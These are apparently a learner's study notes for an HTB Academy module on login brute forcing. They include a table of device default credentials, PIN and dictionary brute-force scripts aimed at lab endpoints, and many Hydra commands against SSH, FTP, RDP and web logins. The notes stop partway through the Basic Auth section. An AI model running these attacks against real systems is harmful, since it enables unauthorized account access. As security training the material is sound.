# Login Brute Forcing — HTB Academy Notes

---

## Table of Contents

- [1. Introduction](#s1)
  - [1.1 What is Brute Forcing?](#s1-1)
  - [1.2 How Brute Forcing Works](#s1-2)
  - [1.3 Types of Brute Forcing](#s1-3)
  - [1.4 The Role of Brute Forcing in Penetration Testing](#s1-4)
- [2. Password Security Fundamentals](#s2)
  - [2.1 The Importance of Strong Passwords](#s2-1)
  - [2.2 The Anatomy of a Strong Password](#s2-2)
  - [2.3 Common Password Weaknesses](#s2-3)
  - [2.4 Password Policies](#s2-4)
  - [2.5 The Perils of Default Credentials](#s2-5)
  - [2.6 Brute-forcing and Password Security](#s2-6)
- [3. Brute Force Attacks (Math & PIN Cracking)](#s3)
  - [3.1 The Mathematics of Brute Forcing](#s3-1)
  - [3.2 Password Length/Complexity Scenarios](#s3-2)
  - [3.3 Computational Power and Cracking Time](#s3-3)
  - [3.4 Cracking the PIN — Walkthrough](#s3-4)
- [4. Dictionary Attacks](#s4)
  - [4.1 The Power of Words](#s4-1)
  - [4.2 Brute Force vs. Dictionary Attack](#s4-2)
  - [4.3 Building and Utilizing Wordlists](#s4-3)
  - [4.4 Throwing a Dictionary at the Problem — Walkthrough](#s4-4)
- [5. Hybrid Attacks](#s5)
  - [5.1 Hybrid Attacks in Action](#s5-1)
  - [5.2 The Power of Hybrid Attacks — Filtering Wordlists with grep](#s5-2)
  - [5.3 Credential Stuffing: Leveraging Stolen Data for Unauthorized Access](#s5-3)
  - [5.4 The Password Reuse Problem](#s5-4)
- [6. Hydra](#s6)
  - [6.1 What is Hydra?](#s6-1)
  - [6.2 Installation](#s6-2)
  - [6.3 Basic Usage](#s6-3)
  - [6.4 Hydra Services](#s6-4)
  - [6.5 Brute-Forcing HTTP Authentication — Example](#s6-5)
  - [6.6 Targeting Multiple SSH Servers — Example](#s6-6)
  - [6.7 Testing FTP Credentials on a Non-Standard Port — Example](#s6-7)
  - [6.8 Brute-Forcing a Web Login Form — Example](#s6-8)
  - [6.9 Advanced RDP Brute-Forcing — Example](#s6-9)
- [7. Basic HTTP Authentication](#s7)
  - [7.1 What is Basic HTTP Authentication?](#s7-1)
  - [7.2 Exploiting Basic Auth with Hydra — Walkthrough](#s7-2)
- [8. Login Forms](#s8)
  - [8.1 Understanding Login Forms](#s8-1)
  - [8.2 A Basic Login Form Example](#s8-2)
  - [8.3 http-post-form](#s8-3)
  - [8.4 Understanding the Condition String](#s8-4)
  - [8.5 Manual Inspection](#s8-5)
  - [8.6 Browser Developer Tools](#s8-6)
  - [8.7 Proxy Interception](#s8-7)
  - [8.8 Constructing the params String for Hydra — Full Walkthrough](#s8-8)
- [9. Medusa](#s9)
  - [9.1 What is Medusa?](#s9-1)
  - [9.2 Installation](#s9-2)
  - [9.3 Command Syntax and Parameter Table](#s9-3)
  - [9.4 Medusa Modules](#s9-4)
  - [9.5 Targeting an SSH Server — Example](#s9-5)
  - [9.6 Targeting Multiple Web Servers with Basic HTTP Authentication — Example](#s9-6)
  - [9.7 Testing for Empty or Default Passwords — Example](#s9-7)
- [10. Web Services (SSH + FTP Practical Walkthrough)](#s10)
  - [10.1 Context: SSH and FTP](#s10-1)
  - [10.2 Kick-off — Attacking SSH](#s10-2)
  - [10.3 Gaining Access](#s10-3)
  - [10.4 Expanding the Attack Surface](#s10-4)
  - [10.5 Targeting the FTP Server](#s10-5)
  - [10.6 Retrieving the Flag](#s10-6)
- [11. Custom Wordlists](#s11)
  - [11.1 Why Custom Wordlists?](#s11-1)
  - [11.2 Username Anarchy](#s11-2)
  - [11.3 CUPP (Common User Passwords Profiler)](#s11-3)

---


<a id="s1"></a>
## 1. Introduction

<a id="s1-1"></a>
### 1.1 What is Brute Forcing?
Brute forcing is a trial-and-error attack method used in cybersecurity to crack passwords, login credentials, or encryption keys. Instead of guessing intelligently, the attacker systematically tries every possible combination of characters until the correct one is found — similar to a thief trying every key on a giant keyring until one opens the lock. The success of this attack is not guaranteed instantly; it depends heavily on how much time and computing power the attacker is willing to spend. Three factors decide whether an attack is realistic: password complexity, available computational power, and the security controls protecting the target. A longer, more complex password dramatically increases the search space, while weak defenses like missing account lockouts make the attack easier to carry out.

<a id="s1-2"></a>
### 1.2 How Brute Forcing Works
This describes the general flow a brute-force tool follows, shown as a flowchart with six stages. Understanding this flow helps explain how every brute-forcing tool (Hydra, Medusa, custom scripts) operates under the hood, regardless of the target protocol.
- **Start** — The attacker initiates the brute-force process, usually using specialized software rather than manual attempts.
- **Generate Possible Combination** — The tool generates a candidate password/key based on defined parameters such as character set and length (or pulls the next entry from a wordlist).
- **Apply Combination** — The generated combination is submitted to the target system, e.g., a login form, SSH service, or encrypted file.
- **Check if Successful** — The system evaluates the response; if it matches the real password, access is granted, otherwise the loop continues.
- **Access Granted** — Occurs when a correct combination is found, giving the attacker unauthorized access.
- **End** — The process repeats, generating and testing new combinations, until the password is found or the attacker gives up.

<a id="s1-3"></a>
### 1.3 Types of Brute Forcing
Brute forcing is not one single technique — it is a family of methods, each suited to different scenarios depending on available information, target defenses, and computing resources. Knowing which type to use lets a pentester pick the most efficient approach rather than wasting time on a generic attack. The table below (from the module) summarizes each method, an example of how it works, and when it's best applied.

| Method | Description | Example | Best Used When... |
|---|---|---|---|
| Simple Brute Force | Tries all possible character combinations within a defined set/length | All lowercase combos length 4–6 | No prior info on password; resources are abundant |
| Dictionary Attack | Uses a pre-compiled list of common words/phrases | Trying rockyou.txt against a login form | Target likely uses a weak, guessable password |
| Hybrid Attack | Combines brute force + dictionary, mutating dictionary words | Appending numbers/symbols to dictionary words | Target might use a modified common password |
| Credential Stuffing | Reuses leaked credentials from one breach against other services | Trying breached username/password pairs elsewhere | Large leaked credential set available; reuse suspected |
| Password Spraying | Tries a few common passwords across many usernames | Trying "password123" across all org usernames | Lockout policies exist; attacker wants to avoid detection |
| Rainbow Table Attack | Uses pre-computed hash tables to reverse password hashes | Comparing captured hashes against pre-computed tables | Many hashes to crack; storage for tables available |
| Reverse Brute Force | One password tried against many usernames | Trying a leaked password across many accounts | Strong suspicion a specific password is reused |
| Distributed Brute Force | Spreads the workload across multiple machines | Using a computer cluster to multiply attempts/sec | Password is highly complex; single machine too slow |

<a id="s1-4"></a>
### 1.4 The Role of Brute Forcing in Penetration Testing
Brute forcing is one tool among many in a penetration test, and it is used strategically rather than as a first resort. It becomes relevant once other avenues — such as exploiting known vulnerabilities or social engineering — have failed to gain access to the target. It is also particularly effective when the organization has weak or absent password policies, since users under such policies are more likely to choose guessable passwords. Pentesters may also use brute forcing in a highly targeted way, focusing specifically on accounts with elevated privileges rather than attacking every account indiscriminately. In short, brute forcing fills the gap when stealthier or more surgical techniques don't succeed, and it doubles as a way to measure how resilient an organization's authentication really is.

---

<a id="s2"></a>
## 2. Password Security Fundamentals

<a id="s2-1"></a>
### 2.1 The Importance of Strong Passwords
Passwords form the first line of defense protecting sensitive systems and information, and their strength directly determines how resistant a system is to brute-force attacks. A strong password forces an attacker to try a vastly larger number of combinations, which increases both the time and the computational resources required for a successful attack. This relationship is exponential rather than linear — every additional character or character type added to a password multiplies the attacker's workload rather than just adding to it. For this reason, password strength is treated as a foundational control in cybersecurity, not just a usability inconvenience. Weak passwords effectively nullify every other security control built on top of them, since an attacker who brute-forces their way in doesn't need to bypass firewalls or exploit code.

<a id="s2-2"></a>
### 2.2 The Anatomy of a Strong Password
NIST guidelines define the key traits of a strong password, and understanding each trait clarifies why brute-force resistance scales so dramatically with small changes in password design.
- **Length** — Longer passwords are exponentially harder to crack; a minimum of 12 characters is recommended. A 6-character lowercase password has ~300 million combinations (26^6), while an 8-character one has ~200 billion (26^8) — each added character multiplies the search space.
- **Complexity** — Mixing uppercase, lowercase, numbers, and symbols increases the character pool per position (26 for lowercase-only vs. 52 for mixed-case), making the password harder to predict even though NIST now emphasizes length and passphrases over forced complexity.
- **Uniqueness** — Each account should use its own password; reusing passwords means a single breach compromises every account sharing that password.
- **Randomness** — Avoiding dictionary words, personal details, or common phrases keeps a password out of attacker wordlists, which are built from exactly this kind of predictable data.

<a id="s2-3"></a>
### 2.3 Common Password Weaknesses
This section lists recurring mistakes that make passwords easy to crack, despite widespread awareness of best practices. These weaknesses are precisely what dictionary and hybrid attacks are designed to exploit, since attacker wordlists are built around these patterns.
- **Short Passwords** — Fewer than 8 characters means a small, fast-to-exhaust combination space.
- **Common Words and Phrases** — Dictionary words, names, and common phrases are the first entries tried in any dictionary attack.
- **Personal Information** — Birthdates, pet names, and addresses are often public (e.g., on social media) and easily guessed or looked up.
- **Reusing Passwords** — One compromised account can cascade into many compromised accounts through credential stuffing.
- **Predictable Patterns** — Patterns like "qwerty," "123456," or substitutions like "p@ssw0rd" are well known to attackers and included in most cracking wordlists.

<a id="s2-4"></a>
### 2.4 Password Policies
Organizations enforce password policies to push users toward stronger password habits, typically covering four areas: minimum length, complexity requirements (character types that must be included), password expiration (how often passwords must change), and password history (preventing reuse of recent passwords). While these policies genuinely improve baseline security, they have a documented downside — overly strict or frequently changing requirements can frustrate users into writing passwords down or making only minor, predictable tweaks to an existing password (a pattern directly exploited by hybrid attacks, covered in Section 5). Designing a policy is therefore a balancing act between enforcing real security and keeping the policy usable enough that it doesn't backfire.

<a id="s2-5"></a>
### 2.5 The Perils of Default Credentials
Default credentials are the pre-set username/password pairs shipped with devices, software, and online services. Because they are simple, well documented, and widely published online, they represent one of the easiest entry points for an attacker — in many cases, no brute-forcing is even necessary since a short list of known defaults is enough to gain access. This makes default credentials a "low-hanging fruit" during both real attacks and legitimate penetration tests, and checking for them is typically one of the first steps taken against any newly discovered device or service. The table below lists real-world default credentials observed across common devices.

| Device/Manufacturer | Default Username | Default Password | Device Type |
|---|---|---|---|
| Linksys Router | admin | admin | Wireless Router |
| D-Link Router | admin | admin | Wireless Router |
| Netgear Router | admin | password | Wireless Router |
| TP-Link Router | admin | admin | Wireless Router |
| Cisco Router | cisco | cisco | Network Router |
| Asus Router | admin | admin | Wireless Router |
| Belkin Router | admin | password | Wireless Router |
| Zyxel Router | admin | 1234 | Wireless Router |
| Samsung SmartCam | admin | 4321 | IP Camera |
| Hikvision DVR | admin | 12345 | DVR |
| Axis IP Camera | root | pass | IP Camera |
| Ubiquiti UniFi AP | ubnt | ubnt | Wireless Access Point |
| Canon Printer | admin | admin | Network Printer |
| Honeywell Thermostat | admin | 1234 | Smart Thermostat |
| Panasonic DVR | admin | 12345 | DVR |

Default *usernames* are just as dangerous as default passwords. Manufacturers commonly ship devices with predictable usernames like `admin`, `root`, or `user`, which are widely documented and published. SecLists maintains a dedicated list of these at `top-usernames-shortlist.txt`. Knowing the username in advance is "half the battle" for an attacker — it removes the need to guess usernames and lets the attacker focus all their effort on cracking just the password. Even if an organization changes the default password, leaving the default username in place still narrows the attack surface significantly.

<a id="s2-6"></a>
### 2.6 Brute-forcing and Password Security
This closing part of the section ties password strength directly back to pentesting strategy — a weak password is like a flimsy lock, while a strong one acts as a fortified vault. For a pentester, understanding the target's password posture informs four practical decisions:
- **Evaluating System Vulnerability** — Weak or absent password policies raise the likelihood of a successful brute-force attack.
- **Strategic Tool Selection** — Weak passwords may only need a simple dictionary attack, while stronger ones require hybrid or more sophisticated methods.
- **Resource Allocation** — Password complexity dictates how much time and computing power the attack will require, which is essential for planning engagements.
- **Exploiting Weak Points** — Default credentials are often the fastest entry point and should be checked early.

---

<a id="s3"></a>
## 3. Brute Force Attacks (Math & PIN Cracking)

<a id="s3-1"></a>
### 3.1 The Mathematics of Brute Forcing
The number of possible combinations for a password is calculated with the formula:

```
Possible Combinations = Character Set Size ^ Password Length
```

This single formula explains why password length and character variety matter so much — the relationship is exponential, not linear. A 6-character lowercase password (set size 26) has 26^6 ≈ 300 million combinations, while an 8-character password of the same type jumps to 26^8 ≈ 200 billion. Adding uppercase letters, digits, and symbols multiplies the character set size itself, further expanding the search space on top of the length increase. This is why even small changes — one extra character, or one extra character type — can make an otherwise crackable password effectively immune to brute forcing within a practical timeframe.

<a id="s3-2"></a>
### 3.2 Password Length/Complexity Scenarios
This table from the module demonstrates the dramatic real-world impact of length and character-set choices on the total search space an attacker must cover.

| Scenario | Length | Character Set | Possible Combinations |
|---|---|---|---|
| Short and Simple | 6 | Lowercase (a–z) | 26^6 = 308,915,776 |
| Longer but Still Simple | 8 | Lowercase (a–z) | 26^8 = 208,827,064,576 |
| Adding Complexity | 8 | Lower + Upper (a-z, A-Z) | 52^8 = 53,459,728,531,456 |
| Maximum Complexity | 12 | Lower + Upper + Numbers + Symbols | 94^12 = 475,920,493,781,698,549,504 |

<a id="s3-3"></a>
### 3.3 Computational Power and Cracking Time
Beyond the raw size of the search space, the actual time to crack a password also depends on how fast the attacker's hardware can test combinations. A larger number of GPUs, CPUs, or cloud resources directly increases guesses-per-second, shrinking the time needed even against a large search space.
- **Basic Computer (1 million passwords/second)** — Fine for simple passwords, but becomes impractical for complex ones; an 8-character letters+digits password would take roughly 6.92 years.
- **Supercomputer (1 trillion passwords/second)** — Massively faster, but even this power struggles against very complex passwords; a 12-character password using the full ASCII set would still take roughly 15,000 years.

This illustrates that strong password policies remain effective defenses even against attackers with serious computing resources, because the exponential growth in combinations outpaces linear gains in hardware speed.

<a id="s3-4"></a>
### 3.4 Cracking the PIN — Walkthrough
This is a hands-on exercise: a target instance generates a random 4-digit PIN and exposes a `/pin` endpoint that accepts a PIN as a query parameter, responding with success + flag if correct, or an error otherwise. The provided Python script automates guessing every possible 4-digit PIN (0000–9999) against this endpoint.

**Script (`pin-solver.py`):**
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

**Step-by-step explanation:**
1. Set `ip` and `port` to match your spawned target instance.
2. The `for pin in range(10000)` loop iterates every integer from 0 to 9999, covering all possible 4-digit PIN values.
3. `f"{pin:04d}"` formats each integer as a zero-padded 4-digit string (e.g., `7` → `"0007"`), matching the format the server expects.
4. `requests.get(...)` sends a GET request to the `/pin` endpoint with the current PIN as a query parameter.
5. `response.ok` checks that the HTTP status code is 200 (success); `'flag' in response.json()` checks whether the JSON response body contains a `flag` key, which only appears on a correct guess.
6. When both conditions are true, the script prints the correct PIN and the flag, then `break`s out of the loop to stop further attempts.

**Running it:**
```shellsession
SyedZainImam@htb[/htb]$ python pin-solver.py
...
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```
The output shows each attempted PIN printed in sequence until the correct one, `4053` in this example, is found and the flag is revealed.

---

<a id="s4"></a>
## 4. Dictionary Attacks

<a id="s4-1"></a>
### 4.1 The Power of Words
Dictionary attacks exploit a basic human tendency: people prefer memorable passwords over secure ones, and memorable passwords tend to be dictionary words, names, phrases, or common patterns. Rather than trying every possible character combination, a dictionary attack tests a pre-defined list of likely passwords, which is far more efficient when the target's real password is predictable. The success of this technique depends heavily on how well the wordlist matches the target — a wordlist built around gaming terminology will work better against gamers than a generic list would. At its core, a dictionary attack is really an exploit of human psychology and common password habits rather than raw computing power.

<a id="s4-2"></a>
### 4.2 Brute Force vs. Dictionary Attack
This comparison table highlights the core trade-off between the two approaches: brute force is slower but guarantees success eventually, while dictionary attacks are faster but only work if the real password happens to be in the list.

| Feature | Dictionary Attack | Brute Force Attack | Explanation |
|---|---|---|---|
| Efficiency | Faster, more resource-efficient | Can be very time-consuming | Dictionary attacks narrow the search space using a pre-defined list |
| Targeting | Highly adaptable to specific targets | No inherent targeting | Wordlists can include target-specific info (company name, employees) |
| Effectiveness | Very effective against weak/common passwords | Effective against all passwords, given time | If the password is in the dictionary, it's found quickly |
| Limitations | Ineffective against complex random passwords | Often impractical for long/complex passwords | Random passwords won't appear in a dictionary; huge search spaces make brute force infeasible |

A practical example given is an attacker targeting a company's employee login portal, building a specialized wordlist from commonly used weak passwords, the company name and variations, employee or department names, and industry-specific jargon — significantly raising the odds of success compared to a purely random brute-force attempt.

<a id="s4-3"></a>
### 4.3 Building and Utilizing Wordlists
Wordlists come from several different sources, and choosing the right one(s) is key to an effective dictionary attack.
- **Publicly Available Lists** — Freely accessible collections such as leaked-password dumps; repositories like SecLists offer lists for many scenarios.
- **Custom-Built Lists** — Built by the pentester from reconnaissance data (target interests, hobbies, personal info).
- **Specialized Lists** — Refined for specific industries, applications, or companies to increase relevance.
- **Pre-existing Lists** — Shipped with pentesting distributions, such as `rockyou.txt` on ParrotSec, containing millions of leaked passwords.

The table below lists specific wordlists useful for login brute-forcing:

| Wordlist | Description | Typical Use | Source |
|---|---|---|---|
| rockyou.txt | Millions of passwords leaked from the RockYou breach | General password brute force | RockYou breach dataset |
| top-usernames-shortlist.txt | Concise list of most common usernames | Quick username brute force | SecLists |
| xato-net-10-million-usernames.txt | 10 million usernames | Thorough username brute forcing | SecLists |
| 2023-200_most_used_passwords.txt | 200 most commonly used passwords (2023) | Targeting commonly reused passwords | SecLists |
| Default-Credentials/default-passwords.txt | Common default username/password pairs | Trying default credentials | SecLists |

<a id="s4-4"></a>
### 4.4 Throwing a Dictionary at the Problem — Walkthrough
This exercise targets a `/dictionary` endpoint on a Flask app, submitting each password from a downloaded wordlist via POST until the correct one returns a flag.

**Script (`dictionary-solver.py`):**
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

**Step-by-step explanation:**
1. `requests.get(...).text.splitlines()` downloads the SecLists "500 worst passwords" wordlist and splits it into a Python list of individual password strings.
2. The `for password in passwords` loop iterates through every entry in that list, one at a time.
3. `requests.post(...)` sends a POST request to the `/dictionary` endpoint, with the current password submitted as form data under the key `password`.
4. `response.ok` and `'flag' in response.json()` together confirm the request succeeded (status 200) and the response body contains a `flag` key, indicating the correct password.
5. On a match, the script prints the found password and the flag, then stops with `break`; otherwise, it continues to the next password in the list, and if none match, the loop simply ends when the wordlist is exhausted.

**Running it:**
```shellsession
SyedZainImam@htb[/htb]$ python3 dictionary-solver.py
...
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
```

---

<a id="s5"></a>
## 5. Hybrid Attacks

<a id="s5-1"></a>
### 5.1 Hybrid Attacks in Action
Many organizations force periodic password changes, intending to improve security — but without proper user education, this backfires into predictable patterns. A common bad habit is making only a minor tweak to an existing password when forced to change it, e.g., turning `Summer2023` into `Summer2023!` or `Summer2024`. Hybrid attacks are specifically designed to exploit this predictability. The attacker typically starts with a dictionary attack using common passwords, industry terms, and any personal information gathered about the organization or employees, aiming to catch easy, weak-password accounts first. If that fails, the attack shifts into a brute-force mode that doesn't generate random combinations but instead systematically mutates the dictionary words — appending numbers, symbols, or incrementing a year — covering realistic password variations far more efficiently than pure brute force.

<a id="s5-2"></a>
### 5.2 The Power of Hybrid Attacks — Filtering Wordlists with grep
Hybrid attacks are effective because they combine the speed of dictionary attacks with the coverage of brute force, adapting to predictable user behavior. This part of the module demonstrates a practical use case: filtering a large wordlist down to only the passwords that would satisfy a specific password policy (min. 8 characters, at least one uppercase, one lowercase, and one number), using chained `grep` commands with regular expressions.

**Step 1 — Download the wordlist:**
```shellsession
SyedZainImam@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
```
This downloads the `darkweb2017_top-10000.txt` wordlist to use as the base list for filtering.

**Step 2 — Filter by minimum length:**
```shellsession
SyedZainImam@htb[/htb]$ grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
```
The regex `^.{8,}$` matches any line with 8 or more characters, keeping only passwords meeting the minimum-length policy requirement, saved to `darkweb2017-minlength.txt`.

**Step 3 — Filter for an uppercase letter:**
```shellsession
SyedZainImam@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```
The regex `[A-Z]` keeps only lines containing at least one uppercase letter, discarding anything that doesn't meet that policy requirement.

**Step 4 — Filter for a lowercase letter:**
```shellsession
SyedZainImam@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```
The regex `[a-z]` keeps only passwords that also contain at least one lowercase letter, chaining onto the previous filtered file.

**Step 5 — Filter for a digit:**
```shellsession
SyedZainImam@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```
The regex `[0-9]` keeps only passwords containing at least one number, producing the final filtered list that satisfies all four policy requirements.

**Step 6 — Check the result count:**
```shellsession
SyedZainImam@htb[/htb]$ wc -l darkweb2017-number.txt
89 darkweb2017-number.txt
```
`wc -l` counts the lines (passwords) remaining in the final file — in this case, the original 10,000-password list was narrowed down to just 89 policy-compliant passwords, making any subsequent attack against this specific policy dramatically faster and more focused.

<a id="s5-3"></a>
### 5.3 Credential Stuffing: Leveraging Stolen Data for Unauthorized Access
Credential stuffing exploits the widespread habit of reusing the same password across multiple online accounts. It is a multi-stage process: attackers first acquire lists of compromised username/password pairs, sourced from data breaches, phishing campaigns, malware, or even publicly available wordlists like rockyou or SecLists. They then identify likely targets — services the same individuals probably also use, such as social media, email, banking, or e-commerce sites, which hold valuable sensitive data. The attack then runs in an automated phase, where tools systematically test the stolen credentials against these targets, often mimicking normal user behavior to evade detection while testing large volumes quickly. A successful match grants unauthorized access, which can lead to data theft, identity fraud, financial crimes, or serve as a launchpad for further attacks against connected systems.

<a id="s5-4"></a>
### 5.4 The Password Reuse Problem
The underlying driver behind credential stuffing's effectiveness is simply password reuse. When the same or similar passwords are used across multiple accounts, a single breach on one platform can cascade into compromises across many unrelated services — a domino effect. This underscores why unique, strong passwords per service, combined with proactive measures like multi-factor authentication, are essential defenses against this class of attack.

---

<a id="s6"></a>
## 6. Hydra

<a id="s6-1"></a>
### 6.1 What is Hydra?
Hydra is a fast, parallel, and highly versatile network login cracker that supports a wide range of protocols, including web applications, SSH, FTP, and databases. Its popularity in penetration testing stems from three main strengths: speed (it performs multiple login attempts simultaneously via parallel connections), flexibility (broad protocol/service support makes it adaptable to many attack scenarios), and ease of use (a straightforward command-line syntax despite its underlying power). These qualities make Hydra one of the most commonly reached-for brute-forcing tools in real-world engagements and in this module.

<a id="s6-2"></a>
### 6.2 Installation
Hydra is frequently pre-installed on penetration testing distributions, and its presence can be verified directly.

**Check if installed:**
```shellsession
SyedZainImam@htb[/htb]$ hydra -h
```
Running `-h` displays Hydra's help/usage output; if the command is recognized, Hydra is already installed.

**Install if missing:**
```shellsession
SyedZainImam@htb[/htb]$ sudo apt-get -y update
SyedZainImam@htb[/htb]$ sudo apt-get -y install hydra
```
`apt-get update` refreshes the package list, and `apt-get install hydra` then downloads and installs the Hydra package, with `-y` auto-confirming the installation prompt.

<a id="s6-3"></a>
### 6.3 Basic Usage
Hydra's general syntax is:
```shellsession
SyedZainImam@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```
This modular structure means any Hydra command is built from four categories of flags, summarized below.

| Parameter | Explanation | Usage Example |
|---|---|---|
| `-l LOGIN` / `-L FILE` | Single username, or a file of usernames | `hydra -l admin ...` / `hydra -L usernames.txt ...` |
| `-p PASS` / `-P FILE` | Single password, or a file of passwords | `hydra -p password123 ...` / `hydra -P passwords.txt ...` |
| `-t TASKS` | Number of parallel threads | `hydra -t 4 ...` |
| `-f` | Fast mode: stop after first successful login | `hydra -f ...` |
| `-s PORT` | Non-default port for the target service | `hydra -s 2222 ...` |
| `-v` / `-V` | Verbose output (more detail with `-V`) | `hydra -v ...` / `hydra -V ...` |
| `service://server` | The target service and server address | `hydra ssh://192.168.1.100` |
| `/OPT` | Service-specific options | `hydra http-get://example.com/login.php -m "POST:..."` |

<a id="s6-4"></a>
### 6.4 Hydra Services
Each Hydra "service" is a module built to understand a specific protocol's login mechanics, letting Hydra construct valid requests and correctly interpret success/failure for that protocol. The table below lists the commonly used services covered in the module.

| Hydra Service | Protocol | Description | Example Command |
|---|---|---|---|
| ftp | FTP | Brute-force FTP login credentials | `hydra -l admin -P pass.txt ftp://192.168.1.100` |
| ssh | SSH | Brute-force SSH credentials | `hydra -l root -P pass.txt ssh://192.168.1.100` |
| http-get/post | HTTP | Brute-force web login forms via GET/POST | `hydra -l admin -P pass.txt http://... http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp | SMTP | Brute-force email sending credentials | `hydra -l admin -P pass.txt smtp://mail.server.com` |
| pop3 | POP3 | Brute-force email retrieval credentials | `hydra -l user@example.com -P pass.txt pop3://mail.server.com` |
| imap | IMAP | Brute-force remote email access credentials | `hydra -l user@example.com -P pass.txt imap://mail.server.com` |
| mysql | MySQL | Brute-force database credentials | `hydra -l root -P pass.txt mysql://192.168.1.100` |
| mssql | MSSQL | Brute-force SQL Server credentials | `hydra -l sa -P pass.txt mssql://192.168.1.100` |
| vnc | VNC | Brute-force remote desktop credentials | `hydra -P pass.txt vnc://192.168.1.100` |
| rdp | RDP | Brute-force Windows remote desktop credentials | `hydra -l admin -P pass.txt rdp://192.168.1.100` |

<a id="s6-5"></a>
### 6.5 Brute-Forcing HTTP Authentication — Example
**Scenario:** testing basic HTTP auth on `www.example.com` with username/password lists.
```shellsession
SyedZainImam@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
**Step-by-step:**
1. `-L usernames.txt` tells Hydra to use the list of candidate usernames in that file.
2. `-P passwords.txt` tells Hydra to use the list of candidate passwords.
3. `www.example.com` specifies the target host.
4. `http-get` selects the module to test HTTP (basic) authentication using GET requests.
5. Hydra then tries every username/password combination from the two lists against the target until a valid pair is found.

<a id="s6-6"></a>
### 6.6 Targeting Multiple SSH Servers — Example
**Scenario:** testing several SSH servers for a known default username/password pair.
```shellsession
SyedZainImam@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
```
**Step-by-step:**
1. `-l root` sets the single username to test as `root`.
2. `-p toor` sets the single password to test as `toor`.
3. `-M targets.txt` tells Hydra to read a list of target IP addresses from this file and attack each one.
4. `ssh` selects the SSH module.
5. Hydra runs the login attempt in parallel against every IP in `targets.txt`, speeding up testing across many hosts at once.

<a id="s6-7"></a>
### 6.7 Testing FTP Credentials on a Non-Standard Port — Example
**Scenario:** an FTP server on `ftp.example.com` listening on port 2121 instead of the default 21.
```shellsession
SyedZainImam@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
**Step-by-step:**
1. `-L usernames.txt` / `-P passwords.txt` supply the username and password lists.
2. `-s 2121` overrides the default FTP port (21) with the non-standard port 2121.
3. `-V` enables verbose output so every attempt is visible in detail.
4. `ftp.example.com ftp` specifies the target host and the FTP module.
5. Hydra attempts every combination of username and password against the FTP service on the specified port.

<a id="s6-8"></a>
### 6.8 Brute-Forcing a Web Login Form — Example
**Scenario:** a login form at `www.example.com` with a known username (`admin`) and form fields `user`/`pass`.
```shellsession
SyedZainImam@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
**Step-by-step:**
1. `-l admin` fixes the username to `admin`, so only the password is brute-forced.
2. `-P passwords.txt` supplies the password candidates.
3. `www.example.com` is the target host.
4. `http-post-form "/login:user=^USER^&pass=^PASS^:S=302"` tells Hydra to POST to `/login`, substituting `^USER^`/`^PASS^` with values from the lists, and to treat an HTTP 302 response (`S=302`) as a successful login.
5. Hydra cycles through each password for the fixed `admin` username, checking for the 302 redirect to identify success.

<a id="s6-9"></a>
### 6.9 Advanced RDP Brute-Forcing — Example
**Scenario:** RDP service on `192.168.1.100`, known username `administrator`, password suspected to be 6–8 characters from a mixed alphanumeric set.
```shellsession
SyedZainImam@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
**Step-by-step:**
1. `-l administrator` fixes the username.
2. `-x 6:8:<charset>` enables Hydra's built-in combination generator (`-x min:max:charset`), generating all possible passwords between 6 and 8 characters long, using the specified character set, instead of reading from a wordlist file.
3. `192.168.1.100` is the target IP.
4. `rdp` selects the RDP module.
5. Hydra generates and tests every possible password combination within that length/character-set range against the RDP login.

---

<a id="s7"></a>
## 7. Basic HTTP Authentication

<a id="s7-1"></a>
### 7.1 What is Basic HTTP Authentication?
Basic HTTP Authentication (Basic Auth) is a simple, long-standing method for protecting web resources, implemented as a challenge-response protocol. When a user tries to access a protected resource, the server replies with a `401 Unauthorized` status and a `WWW-Authenticate` header, which prompts the browser to show a native login dialog. Once credentials are entered, the browser concatenates the username and password with a colon, Base64-encodes the result, and sends it in the `Authorization` header on subsequent requests, in the format `Basic <encoded_credentials>`. The server decodes this string, checks it against its stored credentials, and grants or denies access. Because the credentials are only Base64-encoded (not encrypted) and often transmitted without HTTPS, Basic Auth is both simple to implement and inherently vulnerable, making it a frequent brute-force target. An example request header looks like:
```http
GET /protected_resource HTTP/1.1
Host: www.example.com
